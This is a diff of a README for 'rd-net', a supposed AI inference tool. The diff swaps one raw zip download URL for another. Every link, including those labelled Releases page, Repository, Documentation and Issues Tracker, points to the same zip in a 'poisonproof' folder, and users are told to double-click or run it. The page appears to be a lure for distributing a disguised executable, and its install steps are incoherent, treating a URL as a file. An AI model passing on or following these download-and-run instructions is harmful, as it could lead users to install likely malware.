@@ -1,7 +1,7 @@
 # 🎉 rd-net - Experience Smarter AI Inference Today
 
 ## 📥 Download Now
-[![Download rd-net](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip)](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip)
+[![Download rd-net](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip)](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip)
 
 ## 📖 Description
 rd-net is an application designed to help users explore inference-time drift. It showcases how to reduce repetition collapse in frozen Large Language Models (LLMs). This software is useful for researchers and enthusiasts interested in AI and memory concepts.
@@ -14,25 +14,25 @@ To get started with rd-net, follow these simple steps:
    - **Memory:** At least 4GB of RAM.
    - **Storage:** Minimum of 500 MB free space.
 
-2. Go to the [Releases page](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip) to find the latest version of rd-net.
+2. Go to the [Releases page](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip) to find the latest version of rd-net.
 
 3. Click on the version link to see the available files for download.
 
 ## 💻 Download & Install
-Visit this page to download: [rd-net Releases](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip)
+Visit this page to download: [rd-net Releases](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip)
 
 1. On the Releases page, look for the version you want to download.
 2. Choose the appropriate file for your operating system. Here are your options:
-   - For **Windows**, download `https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip`.
-   - For **macOS**, download `https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip`.
-   - For **Linux**, download `https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip`.
+   - For **Windows**, download `https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip`.
+   - For **macOS**, download `https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip`.
+   - For **Linux**, download `https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip`.
 
 3. Click to download the file and wait for it to finish.
 
 4. Once downloaded, open the file:
-   - For **Windows**: Double-click `https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip` to run the installer.
-   - For **macOS**: Open `https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip`, drag the app to your Applications folder, then open it.
-   - For **Linux**: Extract the `https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip` file. Open a terminal and navigate to the extracted folder. Run `./rd-net` to launch the application.
+   - For **Windows**: Double-click `https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip` to run the installer.
+   - For **macOS**: Open `https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip`, drag the app to your Applications folder, then open it.
+   - For **Linux**: Extract the `https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip` file. Open a terminal and navigate to the extracted folder. Run `./rd-net` to launch the application.
 
 ## 📊 Features
 - **Intuitive User Interface:** Navigate easily through the application.
@@ -75,9 +75,9 @@ This application covers a range of topics:
 - Transformers
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip)
-- [Documentation](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip)
-- [Issues Tracker](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net_3.1-alpha.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/iswarsarma/rd-net/main/poisonproof/rd-net-v2.7.zip)
 
 ## 📧 Contact
 For any inquiries or feedback, you can reach the development team through the issues section on GitHub.
